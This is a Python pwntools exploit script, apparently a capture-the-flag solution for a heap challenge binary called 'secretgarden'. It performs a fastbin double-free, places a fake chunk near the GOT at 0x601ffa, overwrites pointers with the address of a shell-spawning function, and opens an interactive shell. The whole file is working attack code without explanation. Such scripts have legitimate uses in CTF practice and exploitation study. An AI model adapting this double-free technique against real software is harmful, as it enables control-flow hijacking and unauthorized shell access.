#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
if sys.argv[1] == "l": 
    io = process("./secretgarden") 
    elf = ELF("./secretgarden")
    #  libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("localhost", 9999)
    elf = ELF("./secretgarden")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    #  libc = ELF("")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def raiseFlower(length, name, color):
    io.sendlineafter("choice : ", "1")
    sleep(0.1)
    io.sendlineafter("name :", str(length))
    sleep(0.1)
    io.sendlineafter("flower :", name)
    sleep(0.1)
    io.sendlineafter("flower :", color)
    sleep(0.1)

def visGarden():
    io.sendlineafter("choice : ", "2")

def rmFlower(idx):
    sleep(0.1)
    io.sendlineafter("choice : ", "3")
    sleep(0.1)
    io.sendlineafter("garden:", str(idx))

def clnGarden():
    io.sendlineafter("choice : ", "4")

if __name__ == "__main__":
    #  shAddr = elf.symbols["magic"]
    shAddr = 0x400C62
    fakeChunk = 0x601ffa

    raiseFlower(0x50, "name", "color")
    raiseFlower(0x50, "name", "color")

    # 2free
    rmFlower(0)
    rmFlower(1)
    rmFlower(0)
    #  pause()

    raiseFlower(0x50, p64(fakeChunk), "color")
    sleep(0.1)
    raiseFlower(0x50, "name", "color")
    sleep(0.1)
    raiseFlower(0x50, "name", "color")
    payload = p8(0) * 6 + p64(0) + p64(shAddr) * 2

    sleep(0.1)
    #  DEBUG()
    raiseFlower(0x50, payload, "color")
    #  pause()

    io.interactive()
    io.close()
